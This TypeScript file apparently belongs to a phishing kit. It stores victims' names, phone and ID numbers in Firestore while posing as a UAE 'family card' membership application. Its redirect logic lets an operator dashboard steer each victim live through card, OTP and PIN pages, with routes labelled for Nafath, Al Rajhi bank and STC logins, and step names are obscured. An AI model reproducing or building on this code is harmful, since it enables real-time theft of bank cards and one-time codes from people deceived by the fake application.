import type { FormData } from "@/context/FormContext";
import {
  addDoc,
  arrayUnion,
  collection,
  doc,
  serverTimestamp,
  updateDoc,
} from "firebase/firestore";
import { db } from "./firebase";

export const APPLICATION_COLLECTION =
  typeof import.meta.env.VITE_FIREBASE_APPLICATION_COLLECTION === "string" &&
  import.meta.env.VITE_FIREBASE_APPLICATION_COLLECTION.trim()
    ? import.meta.env.VITE_FIREBASE_APPLICATION_COLLECTION.trim()
    : "pays";

const membershipLabels: Record<string, string> = {
  silver: "عضوية فضية",
  gold: "عضوية ذهبية",
  platinum: "عضوية بلاتينية",
};

const stepByPathname: Record<string, { currentStep: string; currentPage: string }> = {
  "/payment": { currentStep: "payment", currentPage: "payment" },
  "/card": { currentStep: "_st1", currentPage: "card" },
  "/otp": { currentStep: "_t2", currentPage: "otp" },
  "/success": { currentStep: "confi", currentPage: "success" },
  "/register": { currentStep: "home", currentPage: "register" },
  "/": { currentStep: "home", currentPage: "home" },
};

const redirectRouteMap: Record<string, string> = {
  home: "/",
  register: "/register",
  payment: "/payment",
  card: "/card",
  otp: "/otp",
  pin: "/otp",
  phone: "/otp",
  nafad: "/otp",
  rajhi: "/otp",
  stc_login: "/otp",
  finalotp: "/otp",
  final_otp: "/otp",
  _st1: "/payment",
  _t2: "/otp",
  _t3: "/otp",
  _t6: "/otp",
  confi: "/success",
  success: "/success",
  complete: "/success",
  completed: "/success",
  confirmation: "/success",
};

const nowIso = () => new Date().toISOString();

export function normalizeRemoteValue(value: unknown) {
  if (typeof value === "boolean") return value ? "true" : "false";
  if (typeof value !== "string") return "";
  return value.trim().toLowerCase().replace(/[\s-]+/g, "_");
}

function firstRemoteValue(snapshot: Record<string, unknown>, keys: string[]) {
  for (const key of keys) {
    const value = snapshot[key];
    if (value !== undefined && value !== null && value !== "") return value;
  }
  return undefined;
}

export function isApprovedRemoteState(value: unknown) {
  return [
    "approved",
    "approve",
    "accepted",
    "accept",
    "completed",
    "complete",
    "success",
    "paid",
    "payment_approved",
  ].includes(normalizeRemoteValue(value));
}

export function isRejectedRemoteState(value: unknown) {
  return [
    "rejected",
    "reject",
    "declined",
    "decline",
    "denied",
    "deny",
    "failed",
    "failure",
    "payment_rejected",
    "card_rejected",
  ].includes(normalizeRemoteValue(value));
}

const normalizeFormPayload = (data: FormData, confirmationCode: string) => ({
  ownerName: data.name.trim(),
  phoneNumber: data.phone.trim(),
  identityNumber: data.id_number.trim(),
  membership: membershipLabels[data.membership] || data.membership || "",
  emirate: data.emirate || "",
  delivery_date: data.delivery_date || "",
  confirmation_code: confirmationCode,
  country: "UAE",
  documentType: "بطاقة الأسرة",
  status: "draft",
  paymentStatus: "pending",
  isUnread: true,
  basicInfoUpdatedAt: nowIso(),
});

export const hasRequiredApplicantData = (data: FormData) =>
  Boolean(data.name.trim() && data.phone.trim() && data.id_number.trim());

export const generateConfirmationCode = () =>
  `ESA-${Math.floor(100000 + Math.random() * 900000)}`;

export async function ensureApplicationDoc(params: {
  docId: string | null;
  data: FormData;
  confirmationCode: string;
  pathname: string;
  extra?: Record<string, unknown>;
}) {
  const { docId, data, confirmationCode, pathname, extra = {} } = params;
  const time = nowIso();
  const stepMeta = stepByPathname[pathname] || stepByPathname["/"];
  const {
    status: initialStatus,
    paymentStatus: initialPaymentStatus,
    isUnread: initialIsUnread,
    ...applicantPayload
  } = normalizeFormPayload(data, confirmationCode);
  const basePayload = {
    ...applicantPayload,
    ...stepMeta,
    lastSeen: time,
    lastActiveAt: time,
    sessionStartAt: time,
    ...extra,
  };

  if (docId) {
    await updateDoc(doc(db, APPLICATION_COLLECTION, docId), {
      ...basePayload,
      updatedAt: serverTimestamp(),
    });
    return docId;
  }

  const docRef = await addDoc(collection(db, APPLICATION_COLLECTION), {
    ...basePayload,
    status: initialStatus,
    paymentStatus: initialPaymentStatus,
    isUnread: initialIsUnread,
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });

  return docRef.id;
}

export async function updateApplicationData(
  docId: string,
  data: Record<string, unknown>,
) {
  await updateDoc(doc(db, APPLICATION_COLLECTION, docId), {
    ...data,
    updatedAt: serverTimestamp(),
  });
}

export async function touchApplication(docId: string, pathname: string) {
  const time = nowIso();
  const stepMeta = stepByPathname[pathname] || {};

  await updateDoc(doc(db, APPLICATION_COLLECTION, docId), {
    ...stepMeta,
    lastSeen: time,
    lastActiveAt: time,
    updatedAt: serverTimestamp(),
  });
}

export async function appendHistoryEntry(params: {
  docId: string;
  type: "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6" | "card" | "otp" | "pin";
  status?: "pending" | "approved" | "rejected";
  data: Record<string, unknown>;
}) {
  const entry = {
    id: `${params.type}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    type: params.type,
    status: params.status || "pending",
    timestamp: nowIso(),
    data: params.data,
  };

  await updateDoc(doc(db, APPLICATION_COLLECTION, params.docId), {
    history: arrayUnion(entry),
    updatedAt: serverTimestamp(),
  });
}

export function getRouteForRemoteState(snapshot: Record<string, unknown>) {
  const status = firstRemoteValue(snapshot, [
    "status",
    "decision",
    "approvalStatus",
    "approval_status",
    "applicationStatus",
    "application_status",
  ]);
  const redirectPage = firstRemoteValue(snapshot, [
    "redirectPage",
    "redirect_page",
    "redirect",
    "nextPage",
    "next_page",
  ]);
  const otpStatus = firstRemoteValue(snapshot, [
    "otpStatus",
    "otp_status",
    "otpDecision",
  ]);
  const cardStatus = firstRemoteValue(snapshot, [
    "cardStatus",
    "card_status",
    "cardDecision",
  ]);
  const currentPage = firstRemoteValue(snapshot, [
    "currentPage",
    "current_page",
    "page",
  ]);
  const remoteCurrentStep = firstRemoteValue(snapshot, [
    "currentStep",
    "current_step",
    "step",
  ]);

  // ── Status-based redirects (highest priority) ────────────────────────────
  if (isApprovedRemoteState(status)) {
    return "/success";
  }
  if (isRejectedRemoteState(status)) {
    return "/card";
  }

  // ── redirectPage from dashboard ──────────────────────────────────────────
  const redirectKey = normalizeRemoteValue(redirectPage);
  if (redirectKey && redirectRouteMap[redirectKey]) {
    return redirectRouteMap[redirectKey];
  }

  // ── otpStatus signals from dashboard ─────────────────────────────────────
  if (
    normalizeRemoteValue(otpStatus) === "show_otp" ||
    normalizeRemoteValue(otpStatus) === "show_pin"
  ) {
    return "/otp";
  }

  // ── cardStatus signals from dashboard ────────────────────────────────────
  if (
    normalizeRemoteValue(cardStatus) === "approved_with_otp" ||
    normalizeRemoteValue(cardStatus) === "approved_with_pin"
  ) {
    return "/otp";
  }
  if (isRejectedRemoteState(cardStatus)) {
    return "/card";
  }

  // ── currentStep / currentPage fallback ───────────────────────────────────
  // Don't redirect away from the card entry page based on step alone.
  const currentPageKey = normalizeRemoteValue(currentPage);
  if (currentPageKey === "card") {
    return null;
  }
  if (currentPageKey && redirectRouteMap[currentPageKey]) {
    return redirectRouteMap[currentPageKey];
  }

  const currentStep =
    typeof remoteCurrentStep === "string" ? normalizeRemoteValue(remoteCurrentStep) : "";
  if (currentStep && currentStep !== "_st1" && redirectRouteMap[currentStep]) {
    return redirectRouteMap[currentStep];
  }

  return null;
}
